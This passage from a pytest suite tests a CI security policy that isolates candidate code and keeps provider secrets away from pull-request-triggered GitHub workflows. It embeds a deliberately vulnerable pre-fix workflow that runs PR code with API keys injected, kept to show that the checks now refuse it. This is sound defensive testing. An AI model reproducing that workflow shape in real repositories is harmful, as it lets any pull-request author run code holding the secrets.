         "import verifier.executor as m; print(m.VALUE)"],
        cwd=str(tmp_path), capture_output=True, text=True, check=False,
        env={**os.environ, "PYTHONPATH": str(tmp_path),
             "PYTHONDONTWRITEBYTECODE": "1"})
    assert probe.returncode == 0, probe.stderr
    assert "candidate code ran" in probe.stdout

    assert enginepolicy._reachable_candidate_packages([str(tmp_path)]) == [
        str(package)]
    with _refusal("candidate_package_reachable"):
        enginepolicy.assert_no_candidate_import(
            modules={}, search_path=[str(tmp_path)])


def test_third_a_regular_package_and_a_module_are_still_reachable(tmp_path):
    """Widening the check must not have narrowed it anywhere."""
    (tmp_path / "regular").mkdir()
    regular = tmp_path / "regular" / "verifier"
    regular.mkdir()
    (regular / "__init__.py").write_text("", encoding="utf-8")
    (tmp_path / "module").mkdir()
    (tmp_path / "module" / "verifier.py").write_text("", encoding="utf-8")
    for entry in ("regular", "module"):
        with _refusal("candidate_package_reachable"):
            enginepolicy.assert_no_candidate_import(
                modules={}, search_path=[str(tmp_path / entry)])


def test_third_a_path_with_no_candidate_package_is_still_accepted(tmp_path):
    (tmp_path / "unrelated").mkdir()
    record = enginepolicy.assert_no_candidate_import(
        modules={}, search_path=[str(tmp_path)])
    assert record["candidate_isolated"] is True


@pytest.mark.parametrize("mutate", [
    pytest.param(lambda job: job.update({"continue-on-error": True}),
                 id="job-level"),
    pytest.param(lambda job: job["steps"][0].update(
        {"continue-on-error": True}), id="step-level"),
])
def test_third_b_continue_on_error_on_a_containment_job_is_refused(mutate):
    """A refusal nobody hears is not a refusal.

    `continue-on-error` on the containment job — or on any one of its steps —
    means `assert_repository_numeric_id` can refuse, the step goes red, and the
    job still reports success. Every downstream `needs:` is then satisfied by a
    gate that failed.

    The old check only looked at credential-bearing jobs. The containment job
    holds no credential, which is precisely why it was invisible to the check,
    and precisely why its failure has to be fatal."""
    document = _document(D0)
    mutate(document["jobs"]["d0-containment"])
    with _refusal("containment_gate_neutralised"):
        workflowfile.assert_gating_is_not_neutralised(document, name=D0)


def test_third_b_the_real_workflows_survive_the_widened_gate_check():
    for name in (D0, D1, D2):
        assert workflowfile.assert_gating_is_not_neutralised(
            _document(name), name=name)["neutralised_gates"] == 0


@pytest.mark.parametrize("expression", SECRET_SYNTAXES)
def test_third_c_a_workflow_level_env_secret_is_refused(expression):
    """Workflow-level `env:` is inherited by every job.

    `assert_secret_containment` walks `jobs`, so it never saw the workflow-level
    mapping — and the job that inherits it includes the containment job, which
    deliberately declares no `environment:` and is therefore behind no
    deployment-branch policy whatsoever."""
    document = _document(D1)
    document["env"] = {"OPENAI_API_KEY": expression}
    with _refusal("workflow_level_secret"):
        workflowfile.assert_no_workflow_level_secret(document, name=D1)


def test_third_c_the_workflow_level_check_reaches_the_full_validator():
    """A check nothing calls is documentation. This one is wired in."""
    source = inspect.getsource(workflowfile.validate_workflow_file)
    assert "assert_no_workflow_level_secret" in source


def test_third_c_a_job_scoped_secret_env_is_reported_not_refused():
    """Job-scoped is a different question — reported so the phase policy and
    the containment gate can rule on it, not refused here."""
    document = _document(D1)
    job = document["jobs"]["d1-trusted-count"]
    job["env"] = {"K": "${{ secrets.TRUSTED_VERIFIER_OPENAI_KEY }}"}
    record = workflowfile.assert_no_workflow_level_secret(document, name=D1)
    assert record["workflow_level_secrets"] == 0
    assert record["job_level_secret_env"] == ["d1-trusted-count"]


def test_third_c_the_real_workflows_declare_no_workflow_level_secret():
    for name in (D0, D1, D2):
        assert workflowfile.assert_no_workflow_level_secret(
            _document(name), name=name)["workflow_level_secrets"] == 0


def _stage_source(tmp_path):
    source = tmp_path / workflowfile.WORKFLOW_DIR
    source.mkdir(parents=True)
    for name in (D0, D1, D2):
        shutil.copy(ROOT / workflowfile.WORKFLOW_DIR / name, source / name)
    live = tmp_path / workflowfile.LIVE_WORKFLOW_DIR
    live.mkdir(parents=True)
    return source, live


def test_third_d_d0_deployed_under_another_filename_is_refused(tmp_path):
    """The comparison keyed on one basename, so a D0 deployed as anything else
    was compared to nothing and reported `d0_deployed: False` — "not deployed"
    for a workflow that is live and running. The push path filter keys on the
    same name, so the divergent copy would also never re-trigger validation."""
    source, live = _stage_source(tmp_path)
    shutil.copy(source / D0, live / "containment.yml")
    with _refusal("d0_deployed_under_unexpected_filename"):
        workflowfile.assert_deployed_copy_matches_source(root=str(tmp_path))


def test_third_d_two_live_copies_of_d0_are_refused(tmp_path):
    """Two files declaring the containment workflow's name means one of them is
    the reviewed copy and the other is whatever it is."""
    source, live = _stage_source(tmp_path)
    shutil.copy(source / D0, live / D0)
    shutil.copy(source / D0, live / "d0-copy.yml")
    with _refusal("d0_deployed_more_than_once"):
        workflowfile.assert_deployed_copy_matches_source(root=str(tmp_path))


def test_third_d_an_unrelated_live_workflow_does_not_confuse_the_match(
        tmp_path):
    source, live = _stage_source(tmp_path)
    (live / "ci.yml").write_text("name: CI\non: push\njobs: {}\n",
                                 encoding="utf-8")
    shutil.copy(source / D0, live / D0)
    assert workflowfile.assert_deployed_copy_matches_source(
        root=str(tmp_path))["d0_deployed"] is True


def test_third_e_declared_transforms_are_recorded_from_a_generator():
    """`applied_transforms` was recorded from the caller's argument after the
    check had already consumed it, so a generator produced an empty list in the
    record while the transforms had in fact been applied. The record disagreed
    with the thing it records — the closure-delta bug, in a second place."""
    record = adapter.normalization_record(
        raw_binding=_raw_binding(),
        adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict()],
        applied_transforms=(t for t in ("RENAME_FIELD", "VALIDATE_ENUM")),
    )
    assert record["applied_transforms"] == ["RENAME_FIELD", "VALIDATE_ENUM"]


def test_third_e_a_forbidden_transform_in_a_generator_is_still_refused():
    with _refusal("adapter_forbidden_transform"):
        adapter.normalization_record(
            raw_binding=_raw_binding(),
            adapter_identity=_adapter_identity(),
            normalized_verdicts=[_verdict()],
            applied_transforms=(t for t in ("RENAME_FIELD",
                                            "DROP_UNKNOWN_FIELD")),
        )


def test_third_e_the_recorded_transforms_change_the_digest():
    """If the record's transforms were cosmetic, the digest would not move —
    and a digest that ignores what the adapter did binds nothing about it."""
    def _record(transforms):
        return adapter.normalization_record(
            raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
            normalized_verdicts=[_verdict()],
            applied_transforms=transforms)["normalized_verdicts_sha256"]

    assert _record([]) != _record(["RENAME_FIELD"])
    assert _record(t for t in ["RENAME_FIELD"]) == _record(["RENAME_FIELD"])


def test_third_a_an_empty_candidate_directory_is_still_reachable(tmp_path):
    """"Empty" is not "safe", and this was found the hard way.

    The widened check's first real hit was an EMPTY `scripts/verifier/` left
    behind by a branch switch — git neither tracks nor removes empty
    directories, so `git status` was clean and the directory was there anyway.

    It is still a namespace-package root: `import verifier` resolves to it and
    `__path__` points at it, so any file that later lands in it is importable
    candidate code. Refusing "empty" rather than reasoning about whether it is
    currently harmless is the same refuse-by-default rule as everywhere else."""
    package = tmp_path / "verifier"
    package.mkdir()
    assert not any(package.iterdir())

    probe = subprocess.run(
        [sys.executable, "-c",
         "import verifier; print(list(verifier.__path__)[0])"],
        cwd=str(tmp_path), capture_output=True, text=True, check=False,
        env={**os.environ, "PYTHONPATH": str(tmp_path),
             "PYTHONDONTWRITEBYTECODE": "1"})
    assert probe.returncode == 0, probe.stderr
    assert probe.stdout.strip() == str(package)

    with _refusal("candidate_package_reachable"):
        enginepolicy.assert_no_candidate_import(
            modules={}, search_path=[str(tmp_path)])


def test_third_a_the_reachability_refusal_names_the_paths(tmp_path):
    """An unnamed count is undiagnosable. The paths are the lane's own
    filesystem, not candidate content, so naming them leaks nothing."""
    (tmp_path / "verifier").mkdir()
    with pytest.raises(errors.LaneRefusal) as excinfo:
        enginepolicy.assert_no_candidate_import(
            modules={}, search_path=[str(tmp_path)])
    assert str(tmp_path / "verifier") in excinfo.value.reason


# --------------------------------------------------------------------------
# V-TRUST: the live workflow directory.
#
# The lane's own three phase files were reviewed to death while the workflow
# that actually held provider credentials sat in `.github/workflows/` and was
# covered by none of it. `independent-verify.yml` ran `on: pull_request`,
# checked out the PR merge ref, injected SECOND_VENDOR_API_KEY and
# OPENAI_API_KEY, and executed `python scripts/independent_verify.py` from that
# checkout — so a pull request editing that script ran its own code with both
# keys. Opening the PR was the whole attack.
#
# The first test below runs the new check against the PRE-FIX file as it stood
# on main, so the defect is demonstrated rather than described.
# --------------------------------------------------------------------------

#: The workflow as it stood on main before this change, byte-for-byte in the
#: parts that matter. Kept as a literal rather than read from git history so
#: the test still means something after the history is rewritten or squashed.
PRE_FIX_INDEPENDENT_VERIFY = """
name: Independent-Verify
on:
  pull_request:
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  cross-vendor:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Cross-vendor review panel (required approver + corroboration)
        env:
          SECOND_VENDOR_API_KEY: ${{ secrets.SECOND_VENDOR_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: python scripts/independent_verify.py
"""


def test_vtrust_the_pre_fix_workflow_is_refused():
    """The defect, reproduced. This is the shape that shipped."""
    document = yaml.safe_load(PRE_FIX_INDEPENDENT_VERIFY)
    assert livepolicy.is_pr_controlled(document) is True
    with pytest.raises(errors.LaneRefusal) as excinfo:
        livepolicy.assert_no_secret_in_pr_controlled_workflow(
            document, name="independent-verify.yml")
    reason = excinfo.value.reason
    assert "pr_controlled_workflow_reaches_a_secret" in reason
    assert "PROVIDER_CLASS" in reason


def test_vtrust_the_live_directory_passes_now():
    """The fix, on the real files GitHub will schedule — not on a fixture."""
    record = livepolicy.validate_live_workflows(root=str(ROOT))
    assert record["count"] >= 3
    for name, one in record["workflows"].items():
        assert one["secrets_reachable"] == 0, name


def test_vtrust_no_live_workflow_holds_a_provider_secret_under_pr_control():
    """The ratchet, stated as the property rather than as a filename.

    Keyed on the trigger and the secret, so the next credential-bearing PR
    workflow is caught whatever it is called — the third review round found
    exactly this filename-vs-property mistake in the D0 deployment check."""
    for path in livepolicy.live_workflow_paths(root=str(ROOT)):
        document = livepolicy._read(path)
        livepolicy.assert_no_secret_in_pr_controlled_workflow(
            document, name=os.path.basename(path))


#: Written out rather than taken from `livepolicy.PR_CONTROLLED_TRIGGERS`.
#: Parametrizing over the constant under test made the suite unable to notice
#: that constant SHRINKING — deleting `pull_request_target` from it just
#: deleted the test cases, and the mutation sweep reported STILL_GREEN. A test
#: that derives its cases from the thing it is testing tests nothing about it.
PR_TRIGGERS_THAT_MUST_BE_COVERED = ("pull_request", "pull_request_target")


def test_vtrust_both_pr_triggers_are_in_the_policy_constant():
    """The half the parametrized test cannot check: that nothing was removed."""
    for trigger in PR_TRIGGERS_THAT_MUST_BE_COVERED:
        assert trigger in livepolicy.PR_CONTROLLED_TRIGGERS


@pytest.mark.parametrize("trigger", PR_TRIGGERS_THAT_MUST_BE_COVERED)
@pytest.mark.parametrize("expression", SECRET_SYNTAXES)
def test_vtrust_every_pr_trigger_and_secret_syntax_is_caught(trigger,
                                                             expression):
    """`pull_request_target` is the worse of the two — it runs with the base
    repository's full secret scope — and both are refused identically, because
    the difference only decides how bad it is."""
    document = {"name": "X", True: {trigger: None},
                "jobs": {"j": {"runs-on": "ubuntu-latest",
                               "steps": [{"env": {"K": expression},
                                          "run": "echo"}]}}}
    with _refusal("pr_controlled_workflow_reaches_a_secret"):
        livepolicy.assert_no_secret_in_pr_controlled_workflow(document,
                                                              name="x.yml")


def test_vtrust_a_non_pr_workflow_may_hold_a_secret():
    """The probe workflow is the real case: `workflow_dispatch` only, gated by
    an environment deployment-branch policy, holding an environment secret.
    That is the correct shape and must not be collateral damage."""
    document = {"name": "X", True: {"workflow_dispatch": None},
                "jobs": {"j": {"runs-on": "ubuntu-latest",
                               "environment": "verifier-probe",
                               "steps": [{"env": {"K": "${{ secrets.PROBE }}"},
                                          "run": "echo"}]}}}
    record = livepolicy.assert_no_secret_in_pr_controlled_workflow(
        document, name="probe.yml")
    assert record["pr_controlled"] is False


def test_vtrust_the_trigger_reader_survives_the_yaml_on_boolean():
    """Unquoted `on:` is a YAML 1.1 boolean, so the key is `True`. A reader
    that looks up "on" finds nothing on every real workflow file and reports
    every one of them as untriggered — which passes everything."""
    parsed = yaml.safe_load("on:\n  pull_request:\njobs: {}\n")
    assert True in parsed and "on" not in parsed
    assert livepolicy.trigger_names(parsed) == ["pull_request"]
    assert livepolicy.is_pr_controlled(parsed) is True
    # And the list and string spellings, which are equally legal.
    assert livepolicy.trigger_names(
        yaml.safe_load("on: [pull_request, push]\njobs: {}\n")) == [
            "pull_request", "push"]
    assert livepolicy.trigger_names(
        yaml.safe_load("on: push\njobs: {}\n")) == ["push"]


def test_vtrust_an_unreadable_live_workflow_is_refused_not_skipped(tmp_path):
    """"Could not parse it, so it passed" is how a check reports success for
    the one file it understood least."""
    live = tmp_path / workflowfile.LIVE_WORKFLOW_DIR
    live.mkdir(parents=True)
    (live / "broken.yml").write_text("{{{ not yaml", encoding="utf-8")
    with _refusal("live_workflow_unreadable"):
        livepolicy.validate_live_workflows(root=str(tmp_path))


def test_vtrust_a_yml_template_is_not_a_live_workflow(tmp_path):
    """The containment the whole D1/D2 split rests on: GitHub reads `.yml` and
    `.yaml` and nothing else, so a credential-bearing template is inert on
    disk. Asserted here because the live scanner must agree with that rule."""
    live = tmp_path / workflowfile.LIVE_WORKFLOW_DIR
    live.mkdir(parents=True)
    (live / "d1.yml.template").write_text(
        "name: D1\non:\n  pull_request:\njobs:\n  j:\n    steps:\n"
        "      - env:\n          K: ${{ secrets.X }}\n", encoding="utf-8")
    assert livepolicy.live_workflow_paths(root=str(tmp_path)) == []
    assert livepolicy.validate_live_workflows(root=str(tmp_path))["count"] == 0


def test_vtrust_every_live_action_is_an_approved_immutable_pin():
    """A moving tag is a supply-chain decision made by someone else at a time
    of their choosing."""
    record = livepolicy.validate_live_workflows(root=str(ROOT))
    seen = 0
    for name, one in record["workflows"].items():
        for pin in one["pinned_actions"]:
            assert len(pin["sha"]) == 40, (name, pin)
            assert pin["release"], (name, pin)
            seen += 1
    assert seen >= 5, "the pinning assertion must actually cover something"


def test_vtrust_declares_no_actions_is_recorded_not_skipped():
    """A workflow that uses no actions is a fact worth recording. A silent skip
    reads as coverage; `assert_actions_pinned`'s own zero-coverage guard exists
    for the same reason and stays in force for the lane's three files."""
    record = livepolicy.validate_live_workflows(root=str(ROOT))
    probe = record["workflows"]["openai-verifier-capability-probe.yml"]
    assert probe["declares_no_actions"] is True
    assert probe["pinned_actions"] == []
    # The lane's own files still refuse a no-actions document.
    with _refusal("workflow_uses_no_actions"):
        workflowfile.assert_actions_pinned({"jobs": {}}, name="lane.yml")


# --------------------------------------------------------------------------
# The operator action packet must not drift from the gate it describes.
# --------------------------------------------------------------------------

OPERATOR_DOC = ROOT / "docs" / "TRUSTED_LANE_OPERATOR_ACTIONS.md"


def test_the_operator_packet_names_every_prerequisite_key():
    """A packet listing fifteen of sixteen actions is a packet that unblocks
    nothing, and the missing one is invisible without this test."""
    text = OPERATOR_DOC.read_text(encoding="utf-8")
    for item in prerequisites.OPERATOR_PREREQUISITES:
        assert f"`{item.key}`" in text, item.key


def test_the_operator_packet_lists_exactly_sixteen_and_no_more():
    """Also catches the other direction: a key deleted from the code while the
    doc still promises it, which reads as a gate that no longer exists."""
    text = OPERATOR_DOC.read_text(encoding="utf-8")
    keys = {item.key for item in prerequisites.OPERATOR_PREREQUISITES}
    assert len(keys) == 16
    quoted = set(re.findall(r"`([a-z_]{8,})`", text))
    stray = {k for k in quoted if k.endswith(("_key", "_run", "_pins"))} - keys
    assert not stray, f"doc names prerequisite-shaped keys the code lacks: {stray}"


def test_the_packet_does_not_claim_attestations_are_verified():
    """The distinction the whole packet rests on. Fifteen of the sixteen are
    assertions that someone did something in a console this repository cannot
    see; only the 404 is a fact about a server."""
    text = OPERATOR_DOC.read_text(encoding="utf-8")
    assert "Recording is not verification" in text
    verifiable = [item for item in prerequisites.OPERATOR_PREREQUISITES
                  if item.verifiable_by_code]
    assert [item.key for item in verifiable] == ["verify_run_404"]
